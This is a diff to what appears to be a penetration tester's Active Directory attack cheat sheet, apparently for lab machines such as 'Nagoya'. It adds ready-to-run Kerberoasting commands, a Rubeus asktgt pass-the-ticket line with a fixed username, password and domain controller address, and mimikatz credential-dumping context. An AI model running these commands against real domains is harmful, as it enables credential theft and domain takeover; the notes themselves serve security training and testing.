@@ -281,6 +281,10 @@ snmp-check [IP] -c [COMMUNITY]
 - **Kerberoasting (Requires user creds):**
   - **Impacket**: `impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request` [General]
   - **Rubeus**: `.\Rubeus.exe kerberoast /outfile:hashes.txt` (Dumps for local cracking)
+- **Rubeus DC Resolution Fix (Nagoya/IPv6 Error) [#adattacks]**:
+  - *Problem*: Logs show `Using domain controller: ::1:88` (IPv6 localhost resolution failure).
+  - *Fix*: Use the `/dc:` flag to force the correct IP.
+  - `Rubeus.exe asktgt /user:svc_mssql /password:Service1 /domain:nagoya-industries.com /dc:192.168.243.21 /ptt`
 - **Inter-Domain Ticket Abuse (Nagoya/Poseidon Style)**:
   - *Scenario*: Compromise parent domain from child.
   ```bash
@@ -557,11 +561,8 @@ foreach ($ip in $ips) {
   sekurlsa::msv
   ```
 - **Windows Context Switching (Runas):**
-  ```powershell
-  runas /user:DOMAIN\Administrator cmd.exe
-  # For local user:
-  runas /user:Administrator cmd.exe
-  ```
+  - **Standard**: `runas /user:DOMAIN\Administrator cmd.exe`
+  - **Rubeus asktgt (DC Fix)**: `Rubeus.exe asktgt /user:[USER] /password:[PASS] /domain:[DOMAIN] /dc:[DC_IP] /ptt`
 - **Windows/PowerShell File Search:**
   ```powershell
   # Force list including hidden files
